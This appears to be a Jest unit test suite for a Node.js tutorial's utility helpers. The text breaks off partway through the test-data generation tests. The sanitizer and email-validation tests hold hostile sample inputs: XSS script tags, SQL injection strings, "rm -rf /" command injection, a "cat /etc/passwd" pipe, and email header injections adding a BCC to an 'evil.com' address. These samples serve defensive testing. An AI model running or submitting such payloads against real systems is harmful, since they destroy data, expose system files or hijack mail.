/**
 * @fileoverview Comprehensive Unit Test Suite for Node.js Tutorial Project Utility Helpers Module
 * @description Complete testing suite validating all helper functions including HTTP response formatting,
 * input sanitization, email validation, performance measurement, retry mechanisms, health checks,
 * cross-platform compatibility, test data generation, mock response creation, security token generation,
 * deep cloning, and user agent parsing with Jest framework achieving ≥ 90% code coverage
 * 
 * @version 1.0.0
 * @since 2025-01-01
 * @author Node.js Tutorial Project Team
 * 
 * Educational Value:
 * - Demonstrates comprehensive unit testing strategies with Jest framework
 * - Showcases testing best practices for utility functions and helper modules
 * - Implements security testing patterns for XSS prevention and input validation
 * - Provides performance testing examples with benchmark validation
 * - Demonstrates async testing patterns with Promise handling and timeout management
 * - Shows cross-platform compatibility testing for Express.js to Flask migration
 * 
 * Technology Stack:
 * - Jest v29+ for comprehensive testing framework with built-in assertions and mocking
 * - SuperTest for HTTP endpoint testing and API validation
 * - Node.js v22.x LTS with ES Modules support for modern JavaScript testing
 * - Custom test helpers for specialized validation and assertion patterns
 * 
 * Testing Coverage:
 * - Unit Tests: ≥ 95% function coverage, ≥ 90% statement coverage
 * - Security Tests: XSS prevention, input sanitization, token generation validation
 * - Performance Tests: Response time < 100ms, memory usage optimization
 * - Cross-Platform Tests: Express.js to Flask format conversion validation
 * - Edge Case Tests: Boundary conditions, error handling, timeout scenarios
 */

// External dependencies with version comments for educational reference
import crypto from 'node:crypto'; // Built-in Node.js crypto module for cryptographic operations
import util from 'node:util'; // Built-in Node.js utilities for object inspection and promisification
import process from 'node:process'; // Built-in Node.js process module for performance measurement

// Internal helper function imports from the main helpers module
import {
  formatHTTPResponse,
  sanitizeInput,
  validateEmail,
  measurePerformance,
  retry,
  createHealthCheck,
  convertToFlaskFormat,
  generateTestData,
  createMockResponse,
  generateSecureToken,
  deepClone,
  parseUserAgent
} from '../../../utils/helpers.js';

// Constants imports for testing validation and configuration
import {
  HTTP_CONSTANTS,
  TESTING_CONSTANTS
} from '../../../utils/constants.js';

// Test helper imports for specialized testing utilities
import {
  createHTTPTestHelper,
  createAssertionHelper,
  createPerformanceTestHelper,
  createSecurityTestHelper,
  createMockDataHelper,
  waitFor
} from '../../helpers/test-helpers.js';

// Extract specific constants for cleaner test code
const { STATUS_CODES, HEADERS } = HTTP_CONSTANTS;
const { PERFORMANCE_TARGETS, TEST_TIMEOUTS } = TESTING_CONSTANTS;

/**
 * Global test environment setup and configuration
 * Initializes testing utilities, mock data, and performance measurement tools
 */
let testEnvironment;
let httpTestHelper;
let assertionHelper;
let performanceTestHelper;
let securityTestHelper;
let mockDataHelper;

/**
 * Test Suite Setup: Initialize comprehensive testing environment
 * Sets up all testing utilities, mock data generators, and validation helpers
 */
beforeAll(async () => {
  // Initialize test environment with comprehensive testing utilities
  testEnvironment = await setupTestEnvironment();
  
  // Create specialized test helpers for different testing scenarios
  httpTestHelper = createHTTPTestHelper();
  assertionHelper = createAssertionHelper();
  performanceTestHelper = createPerformanceTestHelper();
  securityTestHelper = createSecurityTestHelper();
  mockDataHelper = createMockDataHelper();
  
  // Set Jest timeout for async operations and performance tests
  jest.setTimeout(TEST_TIMEOUTS.UNIT_TESTS);
});

/**
 * Test Suite Cleanup: Restore environment and clear resources
 * Ensures clean state between test runs and prevents memory leaks
 */
afterAll(async () => {
  // Perform comprehensive cleanup of test environment
  await cleanupTestEnvironment();
  
  // Clear all test helpers and restore original state
  httpTestHelper = null;
  assertionHelper = null;
  performanceTestHelper = null;
  securityTestHelper = null;
  mockDataHelper = null;
});

/**
 * Individual Test Cleanup: Reset state between tests
 * Ensures test isolation and prevents cross-test contamination
 */
afterEach(() => {
  // Clear all mocks and restore original implementations
  jest.clearAllMocks();
  jest.restoreAllMocks();
  
  // Reset performance measurement state
  if (performanceTestHelper) {
    performanceTestHelper.reset();
  }
});

/**
 * HTTP Response Formatting Helper Function Tests
 * Validates formatHTTPResponse function for proper HTTP response structure,
 * status codes, headers, and content formatting with comprehensive edge cases
 */
describe('formatHTTPResponse Helper Function', () => {
  describe('Success Response Formatting', () => {
    it('should format basic success response with correct structure', () => {
      // Test basic success response formatting
      const response = formatHTTPResponse(200, 'Hello world');
      
      // Validate response structure and content
      expect(response).toHaveProperty('statusCode', 200);
      expect(response).toHaveProperty('headers');
      expect(response).toHaveProperty('body', 'Hello world');
      expect(response.headers).toHaveProperty('Content-Type', 'text/plain');
    });

    it('should format JSON response with proper Content-Type header', () => {
      // Test JSON response formatting with object data
      const data = { message: 'Hello world', timestamp: new Date().toISOString() };
      const response = formatHTTPResponse(200, data, 'application/json');
      
      // Validate JSON response structure
      expect(response.statusCode).toBe(200);
      expect(response.headers['Content-Type']).toBe('application/json');
      expect(JSON.parse(response.body)).toEqual(data);
    });

    it('should include security headers in response formatting', () => {
      // Test security header inclusion in HTTP responses
      const response = formatHTTPResponse(200, 'Test', 'text/plain', { includeSecurityHeaders: true });
      
      // Validate presence of critical security headers
      expect(response.headers).toHaveProperty('X-Content-Type-Options', 'nosniff');
      expect(response.headers).toHaveProperty('X-Frame-Options', 'DENY');
      expect(response.headers).toHaveProperty('X-XSS-Protection', '0');
    });
  });

  describe('Error Response Formatting', () => {
    it('should format 404 error response correctly', () => {
      // Test 404 Not Found error response formatting
      const response = formatHTTPResponse(404, 'Route not found');
      
      // Validate error response structure
      expect(response.statusCode).toBe(404);
      expect(response.body).toBe('Route not found');
      expect(response.headers['Content-Type']).toBe('text/plain');
    });

    it('should format 500 server error with proper structure', () => {
      // Test internal server error response formatting
      const errorData = { error: 'Internal server error', code: 'ERR_INTERNAL' };
      const response = formatHTTPResponse(500, errorData, 'application/json');
      
      // Validate server error response
      expect(response.statusCode).toBe(500);
      expect(JSON.parse(response.body)).toEqual(errorData);
    });

    it('should handle undefined or null response data gracefully', () => {
      // Test edge case handling for undefined/null data
      const responseNull = formatHTTPResponse(204, null);
      const responseUndefined = formatHTTPResponse(204, undefined);
      
      // Validate graceful handling of empty responses
      expect(responseNull.statusCode).toBe(204);
      expect(responseNull.body).toBe('');
      expect(responseUndefined.statusCode).toBe(204);
      expect(responseUndefined.body).toBe('');
    });
  });

  describe('Performance and Edge Cases', () => {
    it('should format responses within performance targets', async () => {
      // Performance test for response formatting speed
      const performanceResult = await measureTestPerformance(
        () => formatHTTPResponse(200, 'Test response'),
        Array(1000).fill('performance test'),
        { iterations: 1000 }
      );
      
      // Validate performance meets targets
      expect(performanceResult.averageTime).toBeLessThan(PERFORMANCE_TARGETS.UNIT_TEST_TIMEOUT / 100);
      expect(performanceResult.memoryUsage).toBeLessThan(10); // Less than 10MB
    });

    it('should handle large response payloads efficiently', () => {
      // Test large payload handling
      const largeData = 'x'.repeat(1000000); // 1MB string
      const response = formatHTTPResponse(200, largeData);
      
      // Validate large response handling
      expect(response.body).toHaveLength(1000000);
      expect(response.statusCode).toBe(200);
    });
  });
});

/**
 * Input Sanitization Helper Function Tests
 * Validates sanitizeInput function for XSS prevention, malicious input detection,
 * script tag removal, and comprehensive security input validation
 */
describe('sanitizeInput Helper Function', () => {
  describe('XSS Prevention Testing', () => {
    it('should remove script tags from input', () => {
      // Test script tag removal for XSS prevention
      const maliciousInput = '<script>alert("XSS")</script>Hello World';
      const sanitized = sanitizeInput(maliciousInput);
      
      // Validate script tags are completely removed
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('</script>');
      expect(sanitized).toContain('Hello World');
    });

    it('should escape HTML entities in user input', () => {
      // Test HTML entity escaping
      const htmlInput = '<div>Test & "quotes" and \'apostrophes\'</div>';
      const sanitized = sanitizeInput(htmlInput);
      
      // Validate HTML entities are properly escaped
      expect(sanitized).toContain('&lt;div&gt;');
      expect(sanitized).toContain('&amp;');
      expect(sanitized).toContain('&quot;');
      expect(sanitized).toContain('&#x27;');
    });

    it('should handle complex XSS attack vectors', async () => {
      // Test against sophisticated XSS attacks
      const xssVectors = await securityTestHelper.generateXSSPayloads();
      
      for (const payload of xssVectors) {
        const sanitized = sanitizeInput(payload);
        
        // Validate no executable JavaScript remains
        expect(sanitized).not.toMatch(/<script[\s\S]*?>[\s\S]*?<\/script>/gi);
        expect(sanitized).not.toMatch(/javascript:/gi);
        expect(sanitized).not.toMatch(/on\w+\s*=/gi);
      }
    });
  });

  describe('SQL Injection Prevention', () => {
    it('should neutralize SQL injection attempts', () => {
      // Test SQL injection pattern neutralization
      const sqlInjection = "'; DROP TABLE users; --";
      const sanitized = sanitizeInput(sqlInjection);
      
      // Validate SQL injection patterns are neutralized
      expect(sanitized).not.toContain('DROP TABLE');
      expect(sanitized).not.toContain('--');
      expect(sanitized).toContain('&#x27;'); // Escaped single quote
    });

    it('should handle UNION SELECT attack patterns', () => {
      // Test UNION SELECT SQL injection prevention
      const unionAttack = "1' UNION SELECT password FROM users --";
      const sanitized = sanitizeInput(unionAttack);
      
      // Validate UNION attacks are neutralized
      expect(sanitized).not.toContain('UNION SELECT');
      expect(sanitized).not.toContain('password FROM users');
    });
  });

  describe('Command Injection Prevention', () => {
    it('should neutralize command injection attempts', () => {
      // Test command injection prevention
      const commandInjection = "; rm -rf / ; echo 'pwned'";
      const sanitized = sanitizeInput(commandInjection);
      
      // Validate command injection is neutralized
      expect(sanitized).not.toContain('rm -rf');
      expect(sanitized).not.toContain(';');
    });

    it('should handle pipe and redirection operators', () => {
      // Test shell operator neutralization
      const shellInput = "test | cat /etc/passwd > output.txt";
      const sanitized = sanitizeInput(shellInput);
      
      // Validate shell operators are neutralized
      expect(sanitized).not.toContain('|');
      expect(sanitized).not.toContain('>');
      expect(sanitized).not.toContain('/etc/passwd');
    });
  });

  describe('Input Validation Edge Cases', () => {
    it('should handle null and undefined inputs gracefully', () => {
      // Test edge case input handling
      expect(sanitizeInput(null)).toBe('');
      expect(sanitizeInput(undefined)).toBe('');
      expect(sanitizeInput('')).toBe('');
    });

    it('should preserve legitimate content while sanitizing', () => {
      // Test legitimate content preservation
      const legitimateInput = 'Hello, this is a normal message with numbers 123 and symbols @#$%';
      const sanitized = sanitizeInput(legitimateInput);
      
      // Validate legitimate content is preserved
      expect(sanitized).toContain('Hello');
      expect(sanitized).toContain('123');
      expect(sanitized).toContain('@#$%');
    });

    it('should handle Unicode and international characters', () => {
      // Test Unicode character handling
      const unicodeInput = 'Hello 世界 🌍 Здравствуй мир';
      const sanitized = sanitizeInput(unicodeInput);
      
      // Validate Unicode preservation
      expect(sanitized).toContain('世界');
      expect(sanitized).toContain('🌍');
      expect(sanitized).toContain('Здравствуй');
    });
  });
});

/**
 * Email Validation Helper Function Tests
 * Validates validateEmail function for comprehensive email format checking,
 * domain validation, and edge case handling with RFC compliance
 */
describe('validateEmail Helper Function', () => {
  describe('Valid Email Format Testing', () => {
    it('should validate standard email formats', () => {
      // Test standard email validation
      const validEmails = [
        'user@example.com',
        'test.email@domain.org',
        'admin+test@company.co.uk',
        'user123@test-domain.net'
      ];
      
      validEmails.forEach(email => {
        expect(validateEmail(email)).toBe(true);
      });
    });

    it('should validate complex but valid email formats', () => {
      // Test complex valid email patterns
      const complexEmails = [
        'user.name+tag@example.com',
        'test_email@domain-name.org',
        'admin123@sub.domain.com',
        'user-name@example123.co.uk'
      ];
      
      complexEmails.forEach(email => {
        expect(validateEmail(email)).toBe(true);
      });
    });

    it('should handle international domain names', () => {
      // Test internationalized domain name support
      const internationalEmails = [
        'test@example.中国',
        'user@домен.рф',
        'admin@テスト.jp'
      ];
      
      // Note: This test depends on IDN support in the validation function
      internationalEmails.forEach(email => {
        const result = validateEmail(email);
        // Validate based on implementation capability
        expect(typeof result).toBe('boolean');
      });
    });
  });

  describe('Invalid Email Format Testing', () => {
    it('should reject obviously invalid email formats', () => {
      // Test invalid email rejection
      const invalidEmails = [
        'notanemail',
        '@domain.com',
        'user@',
        'user..double.dot@domain.com',
        'user@domain',
        'user name@domain.com', // Space in username
        'user@domain..com' // Double dot in domain
      ];
      
      invalidEmails.forEach(email => {
        expect(validateEmail(email)).toBe(false);
      });
    });

    it('should handle malicious email injection attempts', () => {
      // Test email injection prevention
      const maliciousEmails = [
        'user@domain.com<script>alert("xss")</script>',
        'admin@test.com; DROP TABLE users;',
        'user@domain.com\nBCC: hacker@evil.com',
        'test@domain.com\r\nTo: victim@target.com'
      ];
      
      maliciousEmails.forEach(email => {
        expect(validateEmail(email)).toBe(false);
      });
    });

    it('should reject emails with invalid characters', () => {
      // Test invalid character rejection
      const invalidCharEmails = [
        'user@domain.com!',
        'user#@domain.com',
        'user@domain$.com',
        'user@domain.com%'
      ];
      
      invalidCharEmails.forEach(email => {
        expect(validateEmail(email)).toBe(false);
      });
    });
  });

  describe('Edge Cases and Security Testing', () => {
    it('should handle null and undefined inputs', () => {
      // Test edge case input handling
      expect(validateEmail(null)).toBe(false);
      expect(validateEmail(undefined)).toBe(false);
      expect(validateEmail('')).toBe(false);
    });

    it('should validate email length limits', () => {
      // Test email length validation
      const tooLongEmail = 'a'.repeat(250) + '@domain.com';
      const normalLengthEmail = 'user@domain.com';
      
      expect(validateEmail(tooLongEmail)).toBe(false);
      expect(validateEmail(normalLengthEmail)).toBe(true);
    });

    it('should perform domain validation checks', () => {
      // Test domain-specific validation
      const validDomains = ['user@gmail.com', 'admin@company.org'];
      const invalidDomains = ['user@.com', 'admin@domain.'];
      
      validDomains.forEach(email => {
        expect(validateEmail(email)).toBe(true);
      });
      
      invalidDomains.forEach(email => {
        expect(validateEmail(email)).toBe(false);
      });
    });
  });
});

/**
 * Performance Measurement Helper Function Tests
 * Validates measurePerformance function for execution time tracking,
 * resource monitoring, and performance optimization measurement
 */
describe('measurePerformance Helper Function', () => {
  describe('Execution Time Measurement', () => {
    it('should measure function execution time accurately', async () => {
      // Test accurate execution time measurement
      const testFunction = () => {
        // Simulate processing delay
        const start = Date.now();
        while (Date.now() - start < 50) {
          // Busy wait for 50ms
        }
        return 'completed';
      };
      
      const performanceResult = await measurePerformance(testFunction);
      
      // Validate execution time measurement
      expect(performanceResult).toHaveProperty('executionTime');
      expect(performanceResult.executionTime).toBeGreaterThan(45); // Allow 5ms tolerance
      expect(performanceResult.executionTime).toBeLessThan(100); // Reasonable upper bound
    });

    it('should measure async function performance', async () => {
      // Test async function performance measurement
      const asyncFunction = async () => {
        await new Promise(resolve => setTimeout(resolve, 100));
        return 'async completed';
      };
      
      const performanceResult = await measurePerformance(asyncFunction);
      
      // Validate async performance measurement
      expect(performanceResult.executionTime).toBeGreaterThan(90);
      expect(performanceResult.executionTime).toBeLessThan(150);
      expect(performanceResult).toHaveProperty('result', 'async completed');
    });

    it('should provide high-resolution timing measurements', async () => {
      // Test high-resolution timing precision
      const fastFunction = () => Math.random();
      
      const measurements = [];
      for (let i = 0; i < 10; i++) {
        const result = await measurePerformance(fastFunction);
        measurements.push(result.executionTime);
      }
      
      // Validate precision and consistency
      expect(measurements.every(time => time >= 0)).toBe(true);
      expect(measurements.some(time => time < 1)).toBe(true); // Sub-millisecond precision
    });
  });

  describe('Memory Usage Monitoring', () => {
    it('should monitor memory usage during execution', async () => {
      // Test memory usage monitoring
      const memoryIntensiveFunction = () => {
        const largeArray = new Array(100000).fill('memory test');
        return largeArray.length;
      };
      
      const performanceResult = await measurePerformance(memoryIntensiveFunction, {
        includeMemoryUsage: true
      });
      
      // Validate memory monitoring
      expect(performanceResult).toHaveProperty('memoryUsage');
      expect(performanceResult.memoryUsage).toHaveProperty('heapUsed');
      expect(performanceResult.memoryUsage).toHaveProperty('heapTotal');
    });

    it('should detect memory usage changes', async () => {
      // Test memory change detection
      const baselineMemory = process.memoryUsage();
      
      const memoryAllocatingFunction = () => {
        const allocation = new Array(50000).fill('test');
        return allocation;
      };
      
      const result = await measurePerformance(memoryAllocatingFunction, {
        includeMemoryUsage: true,
        baselineMemory
      });
      
      // Validate memory change detection
      expect(result.memoryUsage.heapUsed).toBeGreaterThan(baselineMemory.heapUsed);
    });
  });

  describe('Performance Analysis and Reporting', () => {
    it('should provide comprehensive performance metrics', async () => {
      // Test comprehensive metrics collection
      const testFunction = () => {
        let sum = 0;
        for (let i = 0; i < 10000; i++) {
          sum += Math.sqrt(i);
        }
        return sum;
      };
      
      const metrics = await measurePerformance(testFunction, {
        includeMemoryUsage: true,
        includeCPUUsage: true,
        iterations: 5
      });
      
      // Validate comprehensive metrics
      expect(metrics).toHaveProperty('executionTime');
      expect(metrics).toHaveProperty('memoryUsage');
      expect(metrics).toHaveProperty('averageTime');
      expect(metrics).toHaveProperty('iterations', 5);
    });

    it('should handle performance measurement errors gracefully', async () => {
      // Test error handling in performance measurement
      const errorFunction = () => {
        throw new Error('Test error');
      };
      
      const result = await measurePerformance(errorFunction);
      
      // Validate error handling
      expect(result).toHaveProperty('error');
      expect(result.error.message).toBe('Test error');
      expect(result).toHaveProperty('executionTime');
    });
  });
});

/**
 * Retry Mechanism Helper Function Tests
 * Validates retry function for resilient operation handling, backoff strategies,
 * error recovery, and timeout management with comprehensive async scenarios
 */
describe('retry Helper Function', () => {
  describe('Basic Retry Functionality', () => {
    it('should retry failed operations with exponential backoff', async () => {
      // Test retry with exponential backoff strategy
      let attemptCount = 0;
      const unreliableFunction = async () => {
        attemptCount++;
        if (attemptCount < 3) {
          throw new Error(`Attempt ${attemptCount} failed`);
        }
        return `Success on attempt ${attemptCount}`;
      };
      
      const result = await retry(unreliableFunction, {
        maxAttempts: 5,
        backoffStrategy: 'exponential',
        initialDelay: 10
      });
      
      // Validate retry success
      expect(result).toBe('Success on attempt 3');
      expect(attemptCount).toBe(3);
    });

    it('should respect maximum retry attempts limit', async () => {
      // Test maximum attempts enforcement
      let attemptCount = 0;
      const alwaysFailingFunction = async () => {
        attemptCount++;
        throw new Error(`Attempt ${attemptCount} failed`);
      };
      
      await expect(retry(alwaysFailingFunction, {
        maxAttempts: 3,
        backoffStrategy: 'linear',
        initialDelay: 5
      })).rejects.toThrow('Attempt 3 failed');
      
      expect(attemptCount).toBe(3);
    });

    it('should handle immediately successful operations', async () => {
      // Test successful operation on first attempt
      const successfulFunction = async () => 'Immediate success';
      
      const result = await retry(successfulFunction, {
        maxAttempts: 3
      });
      
      expect(result).toBe('Immediate success');
    });
  });

  describe('Backoff Strategy Testing', () => {
    it('should implement linear backoff correctly', async () => {
      // Test linear backoff timing
      const startTime = Date.now();
      let attemptCount = 0;
      
      const testFunction = async () => {
        attemptCount++;
        if (attemptCount < 3) {
          throw new Error('Retry test');
        }
        return 'success';
      };
      
      await retry(testFunction, {
        maxAttempts: 3,
        backoffStrategy: 'linear',
        initialDelay: 50
      });
      
      const totalTime = Date.now() - startTime;
      
      // Validate linear backoff timing (50ms + 100ms delays minimum)
      expect(totalTime).toBeGreaterThan(140);
      expect(attemptCount).toBe(3);
    });

    it('should implement exponential backoff with jitter', async () => {
      // Test exponential backoff with randomization
      const delays = [];
      let attemptCount = 0;
      
      const testFunction = async () => {
        attemptCount++;
        const attemptStart = Date.now();
        
        if (attemptCount > 1) {
          delays.push(attemptStart);
        }
        
        if (attemptCount < 4) {
          throw new Error('Retry test');
        }
        return 'success';
      };
      
      await retry(testFunction, {
        maxAttempts: 4,
        backoffStrategy: 'exponential',
        initialDelay: 10,
        jitter: true
      });
      
      // Validate exponential pattern with jitter
      expect(delays).toHaveLength(3);
      expect(attemptCount).toBe(4);
    });
  });

  describe('Error Handling and Edge Cases', () => {
    it('should handle timeout scenarios correctly', async () => {
      // Test timeout handling
      const longRunningFunction = async () => {
        await new Promise(resolve => setTimeout(resolve, 200));
        return 'completed';
      };
      
      await expect(retry(longRunningFunction, {
        maxAttempts: 2,
        timeout: 100,
        backoffStrategy: 'linear',
        initialDelay: 10
      })).rejects.toThrow(/timeout/i);
    });

    it('should handle different error types appropriately', async () => {
      // Test error type handling
      let attemptCount = 0;
      const mixedErrorFunction = async () => {
        attemptCount++;
        
        if (attemptCount === 1) {
          throw new TypeError('Type error');
        } else if (attemptCount === 2) {
          throw new RangeError('Range error');
        }
        
        return 'success';
      };
      
      const result = await retry(mixedErrorFunction, {
        maxAttempts: 3,
        retryableErrors: [TypeError, RangeError]
      });
      
      expect(result).toBe('success');
      expect(attemptCount).toBe(3);
    });

    it('should not retry non-retryable errors', async () => {
      // Test non-retryable error handling
      let attemptCount = 0;
      const nonRetryableFunction = async () => {
        attemptCount++;
        const error = new Error('Non-retryable error');
        error.retryable = false;
        throw error;
      };
      
      await expect(retry(nonRetryableFunction, {
        maxAttempts: 3
      })).rejects.toThrow('Non-retryable error');
      
      expect(attemptCount).toBe(1);
    });
  });
});

/**
 * Health Check Helper Function Tests
 * Validates createHealthCheck function for system monitoring, health validation,
 * and service availability checking with comprehensive status reporting
 */
describe('createHealthCheck Helper Function', () => {
  describe('Basic Health Check Creation', () => {
    it('should create basic health check with default configuration', () => {
      // Test basic health check creation
      const healthCheck = createHealthCheck();
      
      // Validate health check function creation
      expect(typeof healthCheck).toBe('function');
      expect(healthCheck.name).toBe('healthCheck');
    });

    it('should execute health check and return status object', async () => {
      // Test health check execution
      const healthCheck = createHealthCheck({
        serviceName: 'test-service',
        version: '1.0.0'
      });
      
      const status = await healthCheck();
      
      // Validate health check status response
      expect(status).toHaveProperty('status');
      expect(status).toHaveProperty('timestamp');
      expect(status).toHaveProperty('uptime');
      expect(status).toHaveProperty('serviceName', 'test-service');
      expect(status).toHaveProperty('version', '1.0.0');
      expect(status.status).toBe('healthy');
    });

    it('should include system metrics in health check', async () => {
      // Test system metrics inclusion
      const healthCheck = createHealthCheck({
        includeSystemMetrics: true
      });
      
      const status = await healthCheck();
      
      // Validate system metrics inclusion
      expect(status).toHaveProperty('system');
      expect(status.system).toHaveProperty('memory');
      expect(status.system).toHaveProperty('cpu');
      expect(status.system).toHaveProperty('platform');
      expect(status.system).toHaveProperty('nodeVersion');
    });
  });

  describe('Custom Health Check Validators', () => {
    it('should support custom validation functions', async () => {
      // Test custom validation integration
      const customValidator = async () => {
        // Simulate database connection check
        await new Promise(resolve => setTimeout(resolve, 10));
        return { database: 'connected', latency: 5 };
      };
      
      const healthCheck = createHealthCheck({
        validators: {
          database: customValidator
        }
      });
      
      const status = await healthCheck();
      
      // Validate custom validator execution
      expect(status).toHaveProperty('checks');
      expect(status.checks).toHaveProperty('database');
      expect(status.checks.database).toHaveProperty('database', 'connected');
      expect(status.checks.database).toHaveProperty('latency', 5);
    });

    it('should handle validator failures gracefully', async () => {
      // Test validator failure handling
      const failingValidator = async () => {
        throw new Error('Service unavailable');
      };
      
      const healthCheck = createHealthCheck({
        validators: {
          externalService: failingValidator
        }
      });
      
      const status = await healthCheck();
      
      // Validate failure handling
      expect(status.status).toBe('unhealthy');
      expect(status.checks.externalService).toHaveProperty('error');
      expect(status.checks.externalService.error).toContain('Service unavailable');
    });

    it('should support multiple concurrent validators', async () => {
      // Test concurrent validator execution
      const fastValidator = async () => ({ fast: 'ok' });
      const slowValidator = async () => {
        await new Promise(resolve => setTimeout(resolve, 50));
        return { slow: 'ok' };
      };
      
      const healthCheck = createHealthCheck({
        validators: {
          fast: fastValidator,
          slow: slowValidator
        },
        timeout: 100
      });
      
      const startTime = Date.now();
      const status = await healthCheck();
      const duration = Date.now() - startTime;
      
      // Validate concurrent execution
      expect(duration).toBeLessThan(70); // Should run concurrently
      expect(status.checks.fast).toHaveProperty('fast', 'ok');
      expect(status.checks.slow).toHaveProperty('slow', 'ok');
    });
  });

  describe('Health Check Configuration and Edge Cases', () => {
    it('should handle timeout scenarios for slow validators', async () => {
      // Test validator timeout handling
      const timeoutValidator = async () => {
        await new Promise(resolve => setTimeout(resolve, 200));
        return { status: 'completed' };
      };
      
      const healthCheck = createHealthCheck({
        validators: {
          timeout: timeoutValidator
        },
        timeout: 100
      });
      
      const status = await healthCheck();
      
      // Validate timeout handling
      expect(status.status).toBe('unhealthy');
      expect(status.checks.timeout).toHaveProperty('error');
      expect(status.checks.timeout.error).toContain('timeout');
    });

    it('should provide detailed error information for debugging', async () => {
      // Test detailed error reporting
      const debugValidator = async () => {
        const error = new Error('Connection refused');
        error.code = 'ECONNREFUSED';
        error.port = 5432;
        throw error;
      };
      
      const healthCheck = createHealthCheck({
        validators: {
          database: debugValidator
        },
        includeErrorDetails: true
      });
      
      const status = await healthCheck();
      
      // Validate detailed error information
      expect(status.checks.database.error).toContain('Connection refused');
      expect(status.checks.database).toHaveProperty('errorCode', 'ECONNREFUSED');
      expect(status.checks.database).toHaveProperty('errorDetails');
    });
  });
});

/**
 * Cross-Platform Conversion Helper Function Tests
 * Validates convertToFlaskFormat function for Express.js to Flask compatibility,
 * response format validation, and API behavior consistency verification
 */
describe('convertToFlaskFormat Helper Function', () => {
  describe('Basic Format Conversion', () => {
    it('should convert Express.js response to Flask format', () => {
      // Test basic Express to Flask conversion
      const expressResponse = {
        statusCode: 200,
        headers: {
          'Content-Type': 'application/json',
          'X-Powered-By': 'Express'
        },
        body: JSON.stringify({ message: 'Hello world' })
      };
      
      const flaskFormat = convertToFlaskFormat(expressResponse);
      
      // Validate Flask format conversion
      expect(flaskFormat).toHaveProperty('status_code', 200);
      expect(flaskFormat).toHaveProperty('headers');
      expect(flaskFormat).toHaveProperty('data');
      expect(flaskFormat.headers['Content-Type']).toBe('application/json');
      expect(flaskFormat.data).toEqual({ message: 'Hello world' });
    });

    it('should handle error responses correctly', () => {
      // Test error response conversion
      const expressError = {
        statusCode: 404,
        headers: { 'Content-Type': 'text/plain' },
        body: 'Route not found'
      };
      
      const flaskFormat = convertToFlaskFormat(expressError);
      
      // Validate error response conversion
      expect(flaskFormat.status_code).toBe(404);
      expect(flaskFormat.data).toBe('Route not found');
      expect(flaskFormat.headers['Content-Type']).toBe('text/plain');
    });

    it('should preserve custom headers during conversion', () => {
      // Test custom header preservation
      const expressResponse = {
        statusCode: 200,
        headers: {
          'Content-Type': 'application/json',
          'X-Custom-Header': 'custom-value',
          'Cache-Control': 'no-cache'
        },
        body: JSON.stringify({ data: 'test' })
      };
      
      const flaskFormat = convertToFlaskFormat(expressResponse);
      
      // Validate custom header preservation
      expect(flaskFormat.headers['X-Custom-Header']).toBe('custom-value');
      expect(flaskFormat.headers['Cache-Control']).toBe('no-cache');
    });
  });

  describe('Advanced Conversion Features', () => {
    it('should handle complex nested data structures', () => {
      // Test complex data structure conversion
      const complexData = {
        user: {
          id: 123,
          profile: {
            name: 'John Doe',
            preferences: ['coding', 'testing'],
            metadata: {
              lastLogin: '2025-01-01T00:00:00Z',
              settings: { theme: 'dark', language: 'en' }
            }
          }
        },
        pagination: {
          page: 1,
          limit: 10,
          total: 100
        }
      };
      
      const expressResponse = {
        statusCode: 200,
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(complexData)
      };
      
      const flaskFormat = convertToFlaskFormat(expressResponse);
      
      // Validate complex data preservation
      expect(flaskFormat.data).toEqual(complexData);
      expect(flaskFormat.data.user.profile.preferences).toEqual(['coding', 'testing']);
      expect(flaskFormat.data.pagination.total).toBe(100);
    });

    it('should convert Express middleware data to Flask context', () => {
      // Test middleware data conversion
      const expressWithMiddleware = {
        statusCode: 200,
        headers: {
          'Content-Type': 'application/json',
          'X-Request-ID': '12345',
          'X-Response-Time': '45ms'
        },
        body: JSON.stringify({ message: 'Success' }),
        middleware: {
          requestId: '12345',
          responseTime: 45,
          userId: 'user123'
        }
      };
      
      const flaskFormat = convertToFlaskFormat(expressWithMiddleware);
      
      // Validate middleware data conversion
      expect(flaskFormat).toHaveProperty('context');
      expect(flaskFormat.context.requestId).toBe('12345');
      expect(flaskFormat.context.responseTime).toBe(45);
      expect(flaskFormat.context.userId).toBe('user123');
    });

    it('should maintain Flask-specific response patterns', () => {
      // Test Flask-specific pattern compliance
      const expressResponse = {
        statusCode: 201,
        headers: {
          'Content-Type': 'application/json',
          'Location': '/api/users/123'
        },
        body: JSON.stringify({
          id: 123,
          created: true,
          url: '/api/users/123'
        })
      };
      
      const flaskFormat = convertToFlaskFormat(expressResponse);
      
      // Validate Flask pattern compliance
      expect(flaskFormat.status_code).toBe(201);
      expect(flaskFormat.headers.Location).toBe('/api/users/123');
      expect(flaskFormat).toHaveProperty('flask_response_type', 'json');
    });
  });

  describe('Cross-Platform Compatibility Testing', () => {
    it('should ensure identical API behavior between platforms', async () => {
      // Test API behavior consistency
      const testCases = [
        {
          endpoint: '/hello',
          expressResponse: {
            statusCode: 200,
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ message: 'Hello world' })
          }
        },
        {
          endpoint: '/good-evening',
          expressResponse: {
            statusCode: 200,
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ message: 'Good evening' })
          }
        }
      ];
      
      for (const testCase of testCases) {
        const flaskFormat = convertToFlaskFormat(testCase.expressResponse);
        
        // Validate consistent behavior
        expect(flaskFormat.status_code).toBe(testCase.expressResponse.statusCode);
        expect(JSON.parse(testCase.expressResponse.body)).toEqual(flaskFormat.data);
      }
    });

    it('should handle platform-specific differences gracefully', () => {
      // Test platform difference handling
      const expressWithPlatformSpecific = {
        statusCode: 200,
        headers: {
          'Content-Type': 'application/json',
          'X-Powered-By': 'Express',
          'Server': 'nginx/1.18.0'
        },
        body: JSON.stringify({ platform: 'nodejs' })
      };
      
      const flaskFormat = convertToFlaskFormat(expressWithPlatformSpecific, {
        removePlatformHeaders: true,
        adaptPlatformData: true
      });
      
      // Validate platform adaptation
      expect(flaskFormat.headers).not.toHaveProperty('X-Powered-By');
      expect(flaskFormat.data.platform).toBe('flask');
    });
  });
});

/**
 * Test Data Generation Helper Function Tests
 * Validates generateTestData function for realistic test data creation,
 * edge case scenario handling, and comprehensive data generation patterns
 */
describe('generateTestData Helper Function', () => {
  describe('Basic Test Data Generation', () => {
    it('should generate basic user test data', () => {
      // Test basic user data generation
      const userData = generateTestData('user', { count: 1 });
      
      // Validate user data structure
